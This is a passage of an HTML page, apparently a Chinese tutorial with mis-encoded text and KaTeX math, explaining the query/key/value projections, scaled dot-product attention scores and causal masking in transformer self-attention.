style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<p>è¿™æ ·ä¸€æ¥ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>ä¸­çš„æ¯ä¸€ä¸ªå‘é‡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ä¾¿é€šè¿‡ä¸‰ä¸ªç‹¬ç«‹çš„çº¿æ€§å˜æ¢è¢«â€œæ‹†åˆ†â€æˆäº†<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^q,x_i^k,x_i^v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.126em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span></span>ï¼Œå…¶ä¸­<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo>=</mo><mi>Q</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup><mo>=</mo><mi>K</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup><mo>=</mo><mi>V</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">x_{i}^{q}= Q[i],x_{i}^{k}= K[i],x_{i}^{v}= V[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1078em;vertical-align:-0.2587em;"/><span class="mord mathnormal">Q</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0087em;vertical-align:-0.2587em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span></p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è®¡ç®—æ³¨æ„åŠ›æƒé‡ã€‚æ ¸å¿ƒæ€æƒ³æ˜¯è®¡ç®—æ¯ä¸€å¯¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>j</mi><mi>k</mi></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x^q_i, x^k_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2439em;vertical-align:-0.3948em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> çš„ç›¸ä¼¼åº¦ï¼Œè¿™å¯ä»¥é€šè¿‡çŸ©é˜µä¹˜æ³•é«˜æ•ˆå®Œæˆã€‚</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mfrac><mrow><mi>Q</mi><mo>â‹…</mo><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><mi>k</mi></msqrt></mfrac><mtext>Â Â Â </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P = \frac{Q \cdot K^T }{\sqrt{k}}\space\space\space (seq\_len,seq\_len)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4483em;vertical-align:-0.93em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.1778em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace">Â </span><span class="mspace">Â </span><span class="mspace">Â </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></div>
<p>çŸ©é˜µ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span> çš„æ¯ä¸ªå…ƒç´  <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> è¡¨ç¤ºç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> ä¸ªä½ç½®çš„æŸ¥è¯¢å‘é‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup></mrow><annotation encoding="application/x-tex">x^q_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span></span></span></span></span> ä¸ç¬¬ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> ä¸ªä½ç½®çš„é”®å‘é‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>j</mi><mi>k</mi></msubsup></mrow><annotation encoding="application/x-tex">x^k_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2439em;vertical-align:-0.3948em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span/></span></span></span></span></span></span></span></span></span> ä¹‹é—´çš„åŸå§‹æ³¨æ„åŠ›å¾—åˆ†ï¼ˆæˆ–ç§°ç›¸ä¼¼åº¦ï¼‰ã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/316d4617ab944f6fa53696dc5d60e210~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=2s7jvieGhnIjAHF7BrzaSXYslTY%3D" alt="c18.jpg" width="100%" loading="lazy"/></p>
<p>è¿™é‡Œä¹‹æ‰€ä»¥è¦é™¤ä»¥ä¸€ä¸ªç¼©æ”¾å› å­<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>k</mi></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.1078em;"/><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span/></span></span></span></span></span></span></span></span>ï¼Œä¸»è¦æ˜¯åœ¨åº”ç”¨ softmax ä¹‹å‰ç¨³å®šæ¢¯åº¦çš„ä¼ æ’­ï¼Œä¸ºäº†ç¡®ä¿è®¡ç®—ç¨³å®šï¼›å½“æˆ‘ä»¬è®¾ç½®çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> è¾ƒå¤§æ—¶ï¼Œç‚¹ç§¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo>â‹…</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">q \cdot k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> çš„ç»å¯¹å€¼å¯èƒ½ä¼šå˜å¾—å¾ˆå¤§ï¼Œè¿™ä¼šå¯¼è‡´ softmax å‡½æ•°çš„æ¢¯åº¦è¶‹è¿‘äºé›¶ï¼ˆé¥±å’ŒåŒºï¼‰ï¼Œä»è€Œå¼•å‘æ¢¯åº¦æ¶ˆå¤±é—®é¢˜ã€‚ç¼©æ”¾æ“ä½œèƒ½å¤Ÿæœ‰æ•ˆç¼“è§£è¿™ä¸€ç°è±¡ï¼Œç¡®ä¿è®­ç»ƒè¿‡ç¨‹çš„ç¨³å®šæ€§ã€‚</p>
<p>å¦‚æœæ­¤æ—¶ä½ éœ€è¦å®ç°<strong>æ©ç æ³¨æ„åŠ›</strong>ï¼ˆå¦‚è§£ç å™¨ä¸­æ‰€ç”¨ï¼‰ï¼Œæ­¤æ—¶çš„æ“ä½œå°†å˜å¾—å¼‚å¸¸ç®€å•ï¼Œä»¤çŸ©é˜µ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>çš„ä¸Šä¸‰è§’åŒºåŸŸçš„å€¼å…¨ä¸ºè´Ÿæ— ç©·æˆ–è€…ä¸€ä¸ªæå¤§çš„è´Ÿæ•°å³å¯ï¼ˆé€šå¸¸å–<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mtext>Â orÂ </mtext><mo>âˆ’</mo><mtext>inf</mtext></mrow><annotation encoding="application/x-tex">-10^9 \space \text{or} \space -\text{inf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord">âˆ’</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace">Â </span><span class="mord text"><span class="mord">or</span></span><span class="mspace">Â </span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord text"><span class="mord">inf</span></span></span></span></span></span>ï¼‰,é™¤æ­¤ä¹‹å¤–ï¼Œå†æ— éœ€å…¶ä»–ä»»ä½•æ“ä½œï¼Œç®€å•æ–¹ä¾¿ã€‚</p>
